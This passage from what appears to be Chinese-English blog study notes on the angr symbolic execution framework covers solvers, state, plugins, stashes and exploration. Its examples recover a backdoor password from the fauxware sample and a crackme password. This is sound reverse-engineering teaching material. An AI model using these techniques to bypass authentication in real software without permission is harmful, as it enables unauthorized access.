<h4 id="floating-point-numbers"><a class="markdownIt-Anchor" href="#floating-point-numbers">#</a> Floating point numbers</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># fresh state</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>state = proj.factory.entry_state()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = state.solver.FPV(<span class="number">3.2</span>, state.solver.fp.FSORT_DOUBLE)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">&lt;FP64 FPV(<span class="number">3.2</span>, DOUBLE)&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = state.solver.FPS(<span class="string">&#x27;b&#x27;</span>, state.solver.fp.FSORT_DOUBLE)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b</span><br><span class="line">&lt;FP64 FPS(<span class="string">&#x27;FP_b_0_64&#x27;</span>, DOUBLE)&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a + b</span><br><span class="line">&lt;FP64 fpAdd(<span class="string">&#x27;RNE&#x27;</span>, FPV(<span class="number">3.2</span>, DOUBLE), FPS(<span class="string">&#x27;FP_b_0_64&#x27;</span>, DOUBLE))&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a + <span class="number">4.4</span></span><br><span class="line">&lt;FP64 FPV(<span class="number">7.6000000000000005</span>, DOUBLE)&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b + <span class="number">2</span> &lt; <span class="number">0</span></span><br><span class="line">&lt;Bool fpLT(fpAdd(<span class="string">&#x27;RNE&#x27;</span>, FPS(<span class="string">&#x27;FP_b_0_64&#x27;</span>, DOUBLE), FPV(<span class="number">2.0</span>, DOUBLE)), FPV(<span class="number">0.0</span>, DOUBLE))&gt;</span><br></pre></td></tr></table></figure>
<p>This is nice, but sometimes we need to be able to work directly with the representation of the float as a bitvector. You can interpret bitvectors as floats and vice versa, with the methods  <code>raw_to_bv</code>  and  <code>raw_to_fp</code> :</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.raw_to_bv()</span><br><span class="line">&lt;BV64 <span class="number">0x400999999999999a</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b.raw_to_bv()</span><br><span class="line">&lt;BV64 fpToIEEEBV(FPS(<span class="string">&#x27;FP_b_0_64&#x27;</span>, DOUBLE))&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>state.solver.BVV(<span class="number">0</span>, <span class="number">64</span>).raw_to_fp()</span><br><span class="line">&lt;FP64 FPV(<span class="number">0.0</span>, DOUBLE)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>state.solver.BVS(<span class="string">&#x27;x&#x27;</span>, <span class="number">64</span>).raw_to_fp()</span><br><span class="line">&lt;FP64 fpToFP(x_1_64, DOUBLE)&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">&lt;FP64 FPV(<span class="number">3.2</span>, DOUBLE)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.val_to_bv(<span class="number">12</span>)</span><br><span class="line">&lt;BV12 <span class="number">0x3</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.val_to_bv(<span class="number">12</span>).val_to_fp(state.solver.fp.FSORT_FLOAT)</span><br><span class="line">&lt;FP32 FPV(<span class="number">3.0</span>, FLOAT)&gt;</span><br></pre></td></tr></table></figure>
<h4 id="more-solving-methods"><a class="markdownIt-Anchor" href="#more-solving-methods">#</a> More Solving Methods</h4>
<p><code>eval</code>  will give you one possible solution to an expression, but what if you want several? What if you want to ensure that the solution is unique? The solver provides you with several methods for common solving patterns:</p>
<ul>
<li><code>solver.eval(expression)</code>  will give you one possible solution to the given expression.</li>
<li><code>solver.eval_one(expression)</code>  will give you the solution to the given expression, or throw an error if more than one solution is possible.</li>
<li><code>solver.eval_upto(expression, n)</code>  will give you up to n solutions to the given expression, returning fewer than n if fewer than n are possible.</li>
<li><code>solver.eval_atleast(expression, n)</code>  will give you n solutions to the given expression, throwing an error if fewer than n are possible.</li>
<li><code>solver.eval_exact(expression, n)</code>  will give you n solutions to the given expression, throwing an error if fewer or more than are possible.</li>
<li><code>solver.min(expression)</code>  will give you the minimum possible solution to the given expression.</li>
<li><code>solver.max(expression)</code>  will give you the maximum possible solution to the given expression.</li>
</ul>
<p>Additionally, all of these methods can take the following keyword arguments:</p>
<ul>
<li><code>extra_constraints</code>  can be passed as a tuple of constraints. These constraints will be taken into account for this evaluation, but will not be added to the state.</li>
<li><code>cast_to</code>  can be passed a data type to cast the result to. Currently, this can only be  <code>int</code>  and  <code>bytes</code> , which will cause the method to return the corresponding representation of the underlying data. For example,  <code>state.solver.eval(state.solver.BVV(0x41424344, 32), cast_to=bytes)</code>  will return  <code>b'ABCD'</code> .</li>
</ul>
<h3 id="machine-state-memory-registers-and-so-on"><a class="markdownIt-Anchor" href="#machine-state-memory-registers-and-so-on">#</a> Machine State - memory, registers, and so on</h3>
<p>quick examples:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> angr, claripy</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>proj = angr.Project(<span class="string">&#x27;/bin/true&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>state = proj.factory.entry_state()</span><br><span class="line"></span><br><span class="line"><span class="comment"># copy rsp to rbp</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>state.regs.rbp = state.regs.rsp</span><br><span class="line"></span><br><span class="line"><span class="comment"># store rdx to memory at 0x1000</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>state.mem[<span class="number">0x1000</span>].uint64_t = state.regs.rdx</span><br><span class="line"></span><br><span class="line"><span class="comment"># dereference rbp</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>state.regs.rbp = state.mem[state.regs.rbp].uint64_t.resolved</span><br><span class="line"></span><br><span class="line"><span class="comment"># add rax, qword ptr [rsp + 8]</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>state.regs.rax += state.mem[state.regs.rsp + <span class="number">8</span>].uint64_t.resolved</span><br></pre></td></tr></table></figure>
<p>这里开始使用更简单的执行方法： <code>state.step()</code> ，其会进行一步符号执行并且返回名为<a href="https://docs.angr.io/en/latest/api.html#angr.engines.successors.SimSuccessors"> <code>angr.engines.successors.SimSuccessors</code> </a> 的对象，并且会提供若干可以被分类成不同执行路径的继承状态，关注该对象的  <code>.successors</code>  属性，其是一个包含所有 “normal” successors of a given step 的 list。</p>
<p>该 list 会包含所有 constraint 的正误状态作为新的 constraint</p>
<p>(这里的 example 应该是用一个 strcmp 作为 constraint)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>proj = angr.Project(<span class="string">&#x27;examples/fauxware/fauxware&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>state = proj.factory.entry_state(stdin=angr.SimFile)  <span class="comment"># ignore that argument for now - we&#x27;re disabling a more complicated default setup for the sake of education</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="meta">... </span>    succ = state.step()</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">if</span> <span class="built_in">len</span>(succ.successors) == <span class="number">2</span>:</span><br><span class="line"><span class="meta">... </span>        <span class="keyword">break</span></span><br><span class="line"><span class="meta">... </span>    state = succ.successors[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>state1, state2 = succ.successors</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>state1</span><br><span class="line">&lt;SimState @ <span class="number">0x400629</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>state2</span><br><span class="line">&lt;SimState @ <span class="number">0x400699</span>&gt;</span><br></pre></td></tr></table></figure>
<p>可以 use  <code>state.posix.stdin.load(0, state.posix.stdin.size)</code>  to retrieve a bitvector representing all the content read from stdin so far</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>input_data = state1.posix.stdin.load(<span class="number">0</span>, state1.posix.stdin.size)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>state1.solver.<span class="built_in">eval</span>(input_data, cast_to=<span class="built_in">bytes</span>)</span><br><span class="line"><span class="string">b&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00SOSNEAKY\x00\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>state2.solver.<span class="built_in">eval</span>(input_data, cast_to=<span class="built_in">bytes</span>)</span><br><span class="line"><span class="string">b&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00S\x00\x80N\x00\x00 \x00\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure>
<h4 id="state-presets"><a class="markdownIt-Anchor" href="#state-presets">#</a> State Presets</h4>
<p><code>project.factory.</code></p>
<ul>
<li><code>.blank_state()</code>  constructs a “blank slate” blank state, with most of its data left uninitialized. When accessing uninitialized data, an unconstrained symbolic value will be returned.</li>
<li><code>.entry_state()</code>  constructs a state ready to execute at the main binary’s entry point.</li>
<li><code>.full_init_state()</code>  constructs a state that is ready to execute through any initializers that need to be run before the main binary’s entry point, for example, shared library constructors or preinitializers. When it is finished with these it will jump to the entry point.</li>
<li><code>.call_state()</code>  constructs a state ready to execute a given function.</li>
</ul>
<p>使用方法：</p>
<ul>
<li>传入起始地址：</li>
</ul>
<p>​	All of these constructors can take an  <code>addr</code>  argument to specify the exact address to start.</p>
<ul>
<li>传入参数：</li>
</ul>
<p>​	If you’re executing in an environment that can take command line arguments or an environment, you can pass a list of arguments through  <code>args</code>  and a dictionary of environment variables through  <code>env</code>  into  <code>entry_state</code>  and  <code>full_init_state</code> . The values in these structures can be strings or bitvectors, and will be serialized into the state as the arguments and environment to the simulated execution. The default  <code>args</code>  is an empty list, so if the program you’re analyzing expects to find at least an  <code>argv[0]</code> , you should always provide that!</p>
<ul>
<li>可以传入符号</li>
</ul>
<p>​	If you’d like to have  <code>argc</code>  be symbolic, you can pass a symbolic bitvector as  <code>argc</code>  to the  <code>entry_state</code>  and  <code>full_init_state</code>  constructors. Be careful, though: if you do this, you should also add a constraint to the resulting state that your value for argc cannot be larger than the number of args you passed into  <code>args</code> .</p>
<ul>
<li>传入函数参数</li>
</ul>
<p>​	To use the call state, you should call it with  <code>.call_state(addr, arg1, arg2, ...)</code> , where  <code>addr</code>  is the address of the function you want to call and  <code>argN</code>  is the Nth argument to that function, either as a Python integer, string, or array, or a bitvector. If you want to have memory allocated and actually pass in a pointer to an object, you should wrap it in an PointerWrapper, i.e.  <code>angr.PointerWrapper(&quot;point to me!&quot;)</code> . The results of this API can be a little unpredictable, but we’re working on it.</p>
<p>​	To specify the calling convention used for a function with  <code>call_state</code> , you can pass a <a href="https://docs.angr.io/en/latest/api.html#angr.calling_conventions.SimCC"> <code>SimCC</code> </a> instance as the  <code>cc</code>  argument.:raw-html-m2r: We try to pick a sane default, but for special cases you will need to help angr out.</p>
<h4 id="对内存操作"><a class="markdownIt-Anchor" href="#对内存操作">#</a> 对内存操作</h4>
<p>对内存地址批量操作</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = proj.factory.blank_state()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.memory.store(<span class="number">0x4000</span>, s.solver.BVV(<span class="number">0x0123456789abcdef0123456789abcdef</span>, <span class="number">128</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.memory.load(<span class="number">0x4004</span>, <span class="number">6</span>) <span class="comment"># load-size is in bytes</span></span><br><span class="line">&lt;BV48 <span class="number">0x89abcdef0123</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> archinfo</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.memory.load(<span class="number">0x4000</span>, <span class="number">4</span>, endness=archinfo.Endness.LE) <span class="comment"># 小端序存储</span></span><br><span class="line">&lt;BV32 <span class="number">0x67452301</span>&gt;</span><br></pre></td></tr></table></figure>
<h4 id="对寄存器操作"><a class="markdownIt-Anchor" href="#对寄存器操作">#</a> 对寄存器操作</h4>
<p><code>state.registers</code>  ： <a href="https://docs.angr.io/en/latest/advanced-topics/ir.html#intermediate-representation">Intermediate Representation - angr documentation</a></p>
<p><a href="https://github.com/angr/archinfo">angr/archinfo: Classes with architecture-specific information useful to other projects. (github.com)</a></p>
<h4 id="state-options"><a class="markdownIt-Anchor" href="#state-options">#</a> State Options</h4>
<p><a href="https://docs.angr.io/en/latest/appendix/options.html#list-of-state-options">https://docs.angr.io/en/latest/appendix/options.html#list-of-state-options</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Example: enable lazy solves, an option that causes state satisfiability to be checked as infrequently as possible.</span></span><br><span class="line"><span class="comment"># This change to the settings will be propagated to all successor states created from this state after this line.</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.options.add(angr.options.LAZY_SOLVES)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a new state with lazy solves enabled</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = proj.factory.entry_state(add_options=&#123;angr.options.LAZY_SOLVES&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a new state without simplification options enabled</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = proj.factory.entry_state(remove_options=angr.options.simplification)</span><br></pre></td></tr></table></figure>
<h3 id="plugins"><a class="markdownIt-Anchor" href="#plugins">#</a> Plugins</h3>
<h4 id="state-plugins"><a class="markdownIt-Anchor" href="#state-plugins">#</a> State Plugins</h4>
<p><a href="https://docs.angr.io/en/latest/extending-angr/state_plugins.html#state-plugins">implement new kinds of data storage</a></p>
<p>For example, the normal  <code>memory</code>  plugin simulates a flat memory space, but analyses can choose to enable the “abstract memory” plugin, which uses alternate data types for addresses to simulate free-floating memory mappings independent of address, to provide  <code>state.memory</code> . Conversely, plugins can reduce code complexity:  <code>state.memory</code>  and  <code>state.registers</code>  are actually two different instances of the same plugin, since the registers are emulated with an address space as well.</p>
<h4 id="the-globals-plugin"><a class="markdownIt-Anchor" href="#the-globals-plugin">#</a> The globals plugin</h4>
<p><code>state.globals</code>  is an extremely simple plugin: it implements the interface of a standard Python dict, allowing you to store arbitrary data on a state.</p>
<h4 id="the-history-plugin"><a class="markdownIt-Anchor" href="#the-history-plugin">#</a> The history plugin</h4>
<p><code>state.history</code>  is a very important plugin storing historical data about the path a state has taken during execution. It is actually a linked list of several history nodes, each one representing a single round of execution—you can traverse this list with  <code>state.history.parent.parent</code>  etc.</p>
<p>To make it more convenient to work with this structure, the history also provides several efficient iterators over the history of certain values. In general, these values are stored as  <code>history.recent_NAME</code>  and the iterator over them is just  <code>history.NAME</code> . For example,  <code>for addr in state.history.bbl_addrs: print hex(addr)</code>  will print out a basic block address trace for the binary, while  <code>state.history.recent_bbl_addrs</code>  is the list of basic blocks executed in the most recent step,  <code>state.history.parent.recent_bbl_addrs</code>  is the list of basic blocks executed in the previous step, etc. If you ever need to quickly obtain a flat list of these values, you can access  <code>.hardcopy</code> , e.g.  <code>state.history.bbl_addrs.hardcopy</code> . Keep in mind though, index-based accessing is implemented on the iterators.</p>
<p>Here is a brief listing of some of the values stored in the history:</p>
<ul>
<li><code>history.descriptions</code>  is a listing of string descriptions of each of the rounds of execution performed on the state.</li>
<li><code>history.bbl_addrs</code>  is a listing of the basic block addresses executed by the state. There may be more than one per round of execution, and not all addresses may correspond to binary code - some may be addresses at which SimProcedures are hooked.</li>
<li><code>history.jumpkinds</code>  is a listing of the disposition of each of the control flow transitions in the state’s history, as VEX enum strings.</li>
<li><code>history.jump_guards</code>  is a listing of the conditions guarding each of the branches that the state has encountered.</li>
<li><code>history.events</code>  is a semantic listing of “interesting events” which happened during execution, such as the presence of a symbolic jump condition, the program popping up a message box, or execution terminating with an exit code.</li>
<li><code>history.actions</code>  is usually empty, but if you add the  <code>angr.options.refs</code>  options to the state, it will be populated with a log of all the memory, register, and temporary value accesses performed by the program.</li>
</ul>
<h4 id="the-callstack-plugin"><a class="markdownIt-Anchor" href="#the-callstack-plugin">#</a> The callstack plugin</h4>
<p>angr will track the call stack for the emulated program. On every call instruction, a frame will be added to the top of the tracked callstack, and whenever the stack pointer drops below the point where the topmost frame was called, a frame is popped. This allows angr to robustly store data local to the current emulated function.</p>
<p>Similar to the history, the callstack is also a linked list of nodes, but there are no provided iterators over the contents of the nodes - instead you can directly iterate over  <code>state.callstack</code>  to get the callstack frames for each of the active frames, in order from most recent to oldest. If you just want the topmost frame, this is  <code>state.callstack</code> .</p>
<ul>
<li><code>callstack.func_addr</code>  is the address of the function currently being executed</li>
<li><code>callstack.call_site_addr</code>  is the address of the basic block which called the current function</li>
<li><code>callstack.stack_ptr</code>  is the value of the stack pointer from the beginning of the current function</li>
<li><code>callstack.ret_addr</code>  is the location that the current function will return to if it returns</li>
</ul>
<h4 id="io"><a class="markdownIt-Anchor" href="#io">#</a> I/O</h4>
<p><a href="https://docs.angr.io/en/latest/advanced-topics/file_system.html#working-with-file-system-sockets-and-pipes">Working with File System, Sockets, and Pipes</a></p>
<h4 id="copying-and-merging"><a class="markdownIt-Anchor" href="#copying-and-merging">#</a> Copying and Merging</h4>
<p>A state supports very fast copies, so that you can explore different possibilities:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>proj = angr.Project(<span class="string">&#x27;/bin/true&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = proj.factory.blank_state()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s1 = s.copy()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s2 = s.copy()</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s1.mem[<span class="number">0x1000</span>].uint32_t = <span class="number">0x41414141</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s2.mem[<span class="number">0x1000</span>].uint32_t = <span class="number">0x42424242</span></span><br></pre></td></tr></table></figure>
<p>States can also be merged together.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># merge will return a tuple. the first element is the merged state</span></span><br><span class="line"><span class="comment"># the second element is a symbolic variable describing a state flag</span></span><br><span class="line"><span class="comment"># the third element is a boolean describing whether any merging was done</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>(s_merged, m, anything_merged) = s1.merge(s2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># this is now an expression that can resolve to &quot;AAAA&quot; *or* &quot;BBBB&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>aaaa_or_bbbb = s_merged.mem[<span class="number">0x1000</span>].uint32_t</span><br><span class="line"><span class="built_in">print</span>(aaaa_or_bbbb)</span><br><span class="line"><span class="comment"># 打印该地址可能的数值集合</span></span><br><span class="line"><span class="comment"># &lt;uint32_t &lt;BV32 (if state_merge_0_0_16 == 0x1 then 66 else (if state_merge_0_0_16 == 0x0 then 65 else 0)) .. (if state_merge_0_0_16 == 0x1 then 66 else (if state_merge_0_0_16 == 0x0 then 65 else 0)) .. (if state_merge_0_0_16 == 0x1 then 66 else (if state_merge_0_0_16 == 0x0 then 65 else 0)) .. (if state_merge_0_0_16 == 0x1 then 66 else (if state_merge_0_0_16 == 0x0 then 65 else 0))&gt; at 0x1000&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="simulation-managers"><a class="markdownIt-Anchor" href="#simulation-managers">#</a> Simulation Managers</h3>
<p>描述：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Simulation managers let you wrangle multiple states in a slick way. States are organized into “stashes”, which you can step forward, filter, merge, and move around as you wish.</span><br></pre></td></tr></table></figure>
<h4 id="stepping"><a class="markdownIt-Anchor" href="#stepping">#</a> Stepping</h4>
<p><code>.step()</code> ： 前进一个 basic block</p>
<p><code>.run()</code> ：执行到所有 deadended，并且获得所有 deadended states（例如到达 exit syscall，此时该 state 会被从 <code>active stash</code>  中移除并放入 <code>deadended states</code> ）</p>
<h4 id="stash-management"><a class="markdownIt-Anchor" href="#stash-management">#</a> Stash Management</h4>
<p><code>.move()</code> ： <code>from_stash</code>   <code>to_stash</code>   <code>filter_func (optional, default:everything)</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># eg.检查所有执行路径已终止（deadended）的状态，查找其中在程序的标准输出中打印了&#x27;Welcome&#x27;的状态，并将这些状态移动到一个名为&#x27;authenticated&#x27;的新stash，以便进一步分析或单独处理。</span></span><br><span class="line">simgr.move(from_stash=<span class="string">&#x27;deadended&#x27;</span>, to_stash=<span class="string">&#x27;authenticated&#x27;</span>, filter_func=<span class="keyword">lambda</span> s: <span class="string">b&#x27;Welcome&#x27;</span> <span class="keyword">in</span> s.posix.dumps(<span class="number">1</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>simgr</span><br><span class="line">&lt;SimulationManager <span class="keyword">with</span> <span class="number">2</span> authenticated, <span class="number">1</span> deadended&gt;</span><br></pre></td></tr></table></figure>
<p>stash 的类型为 list，可以通过如下方式访问：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> simgr.deadended + simgr.authenticated:</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(<span class="built_in">hex</span>(s.addr))</span><br><span class="line"><span class="number">0x1000030</span></span><br><span class="line"><span class="number">0x1000078</span></span><br><span class="line"><span class="number">0x1000078</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>simgr.one_deadended</span><br><span class="line">&lt;SimState @ <span class="number">0x1000030</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>simgr.mp_authenticated</span><br><span class="line">MP([&lt;SimState @ <span class="number">0x1000078</span>&gt;, &lt;SimState @ <span class="number">0x1000078</span>&gt;])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>simgr.mp_authenticated.posix.dumps(<span class="number">0</span>)</span><br><span class="line">MP([<span class="string">&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00SOSNEAKY\x00&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00S\x80\x80\x80\x80@\x80@\x00&#x27;</span>])</span><br></pre></td></tr></table></figure>
<p>所以 link 呢</p>
<p><img loading="lazy" data-src="angr%E5%88%9D%E6%8E%A2/image-20231024140622184-16981317543812.png" alt="image-20231024140622184"></p>
<h4 id="stash-types"><a class="markdownIt-Anchor" href="#stash-types">#</a> Stash types</h4>
<table>
<thead>
<tr>
<th>Stash</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>active</td>
<td>This stash contains the states that will be stepped by default, unless an alternate stash is specified.</td>
</tr>
<tr>
<td>deadended</td>
<td>A state goes to the deadended stash when it cannot continue the execution for some reason, including no more valid instructions, unsat state of all of its successors, or an invalid instruction pointer.</td>
</tr>
<tr>
<td>pruned</td>
<td>When using  <code>LAZY_SOLVES</code> , states are not checked for satisfiability unless absolutely necessary. When a state is found to be unsat in the presence of  <code>LAZY_SOLVES</code> , the state hierarchy is traversed to identify when, in its history, it initially became unsat. All states that are descendants of that point (which will also be unsat, since a state cannot become un-unsat) are pruned and put in this stash.</td>
</tr>
<tr>
<td>unconstrained</td>
<td>If the  <code>save_unconstrained</code>  option is provided to the SimulationManager constructor, states that are determined to be unconstrained (i.e., with the instruction pointer controlled by user data or some other source of symbolic data) are placed here.</td>
</tr>
<tr>
<td>unsat</td>
<td>If the  <code>save_unsat</code>  option is provided to the SimulationManager constructor, states that are determined to be unsatisfiable (i.e., they have constraints that are contradictory, like the input having to be both “AAAA” and “BBBB” at the same time) are placed here.</td>
</tr>
<tr>
<td>errored</td>
<td>If, during execution, an error is raised, then the state will be wrapped in an  <code>ErrorRecord</code>  object, which contains the state and the error it raised, and then the record will be inserted into  <code>errored</code> .                launch a debug shell at the site of the error with  <code>record.debug()</code> .</td>
</tr>
</tbody>
</table>
<h3 id="exploration"><a class="markdownIt-Anchor" href="#exploration">#</a> Exploration</h3>
<p><code>.explore()</code> ： <code>find</code>  argument (指令的结束地址或结束地址列表，或函数根据某种标准的返回状态)</p>
<p>当满足后，放入 <code>found</code>  stash，然后结束符号执行，可以同样声明 <code>avoid</code>  condition（格式与 <code>find</code>  相同）</p>
<p><code>num_find</code>  指定 return 前找到多少数量的 <code>find</code> （default = 1，如果所有 active stash 的 state 被全部执行则同样 return）</p>
<p>eg.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">proj = angr.Project(<span class="string">&#x27;examples/CSCI-4968-MBE/challenges/crackme0x00a/crackme0x00a&#x27;</span>)</span><br><span class="line">simgr = proj.factory.simgr()</span><br><span class="line">simgr.explore(find=<span class="keyword">lambda</span> s: <span class="string">b&quot;Congrats&quot;</span> <span class="keyword">in</span> s.posix.dumps(<span class="number">1</span>))</span><br><span class="line">s = simgr.found[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(s.posix.dumps(<span class="number">1</span>))</span><br><span class="line"><span class="comment"># Enter password: Congrats!</span></span><br><span class="line">flag = s.posix.dumps(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># g00dJ0B!</span></span><br></pre></td></tr></table></figure>
<p>其他样例：<a href="https://docs.angr.io/en/latest/examples.html#angr-examples">angr examples - angr documentation</a></p>
<h3 id="exploration-techniques"><a class="markdownIt-Anchor" href="#exploration-techniques">#</a> Exploration Techniques</h3>
<p>angr ships with several pieces of canned functionality that let you customize the behavior of a simulation manager, called <em>exploration techniques</em>. The archetypical example of why you would want an exploration technique is to modify the pattern in which the state space of the program is explored - the default “step everything at once” strategy is effectively breadth-first search, but with an exploration technique you could implement, for example, depth-first search. However, the instrumentation power of these techniques is much more flexible than that - you can totally alter the behavior of angr’s stepping process. Writing your own exploration techniques will be covered in a later chapter.</p>
<p>To use an exploration technique, call  <code>simgr.use_technique(tech)</code> , where tech is an instance of an ExplorationTechnique subclass. angr’s built-in exploration techniques can be found under  <code>angr.exploration_techniques</code> .</p>
<p>Here’s a quick overview of some of the built-in ones:</p>
<ul>
<li><em>DFS</em>: Depth first search, as mentioned earlier. Keeps only one state active at once, putting the rest in the  <code>deferred</code>  stash until it deadends or errors.</li>
<li><em>Explorer</em>: This technique implements the  <code>.explore()</code>  functionality, allowing you to search for and avoid addresses.</li>
<li><em>LengthLimiter</em>: Puts a cap on the maximum length of the path a state goes through.</li>
<li><em>LoopSeer</em>: Uses a reasonable approximation of loop counting to discard states that appear to be going through a loop too many times, putting them in a  <code>spinning</code>  stash and pulling them out again if we run out of otherwise viable states.</li>
<li><em>ManualMergepoint</em>: Marks an address in the program as a merge point, so states that reach that address will be briefly held, and any other states that reach that same point within a timeout will be merged together.</li>
<li><em>MemoryWatcher</em>: Monitors how much memory is free/available on the system between simgr steps and stops exploration if it gets too low.</li>
<li><em>Oppologist</em>: The “operation apologist” is an especially fun gadget - if this technique is enabled and angr encounters an unsupported instruction, for example a bizzare and foreign floating point SIMD op, it will concretize all the inputs to that instruction and emulate the single instruction using the unicorn engine, allowing execution to continue.</li>
<li><em>Spiller</em>: When there are too many states active, this technique can dump some of them to disk in order to keep memory consumption low.</li>
<li><em>Threading</em>: Adds thread-level parallelism to the stepping process. This doesn’t help much because of Python’s global interpreter locks, but if you have a program whose analysis spends a lot of time in angr’s native-code dependencies (unicorn, z3, libvex) you can seem some gains.</li>
<li><em>Tracer</em>: An exploration technique that causes execution to follow a dynamic trace recorded from some other source. The <a href="https://github.com/angr/tracer">dynamic tracer repository</a> has some tools to generate those traces.</li>
<li><em>Veritesting</em>: An implementation of a [CMU paper](<a href="https://users.ece.cmu.edu/~dbrumley/pdf/Avgerinos">https://users.ece.cmu.edu/~dbrumley/pdf/Avgerinos</a> et al._2014_Enhancing Symbolic Execution with Veritesting.pdf) on automatically identifying useful merge points. This is so useful, you can enable it automatically with  <code>veritesting=True</code>  in the SimulationManager constructor! Note that it frequenly doesn’t play nice with other techniques due to the invasive way it implements static symbolic execution.</li>
</ul>
<p>Look at the API documentation for the <a href="https://docs.angr.io/en/latest/api.html#angr.sim_manager.SimulationManager"> <code>SimulationManager</code> </a> and <a href="https://docs.angr.io/en/latest/api.html#angr.exploration_techniques.ExplorationTechnique"> <code>ExplorationTechnique</code> </a> classes for more information.</p>
<h3 id="simulation-and-instrumentation"><a class="markdownIt-Anchor" href="#simulation-and-instrumentation">#</a> Simulation and Instrumentation</h3>
<table>
<thead>
<tr>
<th>Attribute</th>
<th>Guard Condition</th>
<th>Instruction Pointer</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>successors</code></td>
<td>True (can be symbolic, but constrained to True)</td>
<td>Can be symbolic (but 256 solutions or less; see  <code>unconstrained_successors</code> ).</td>
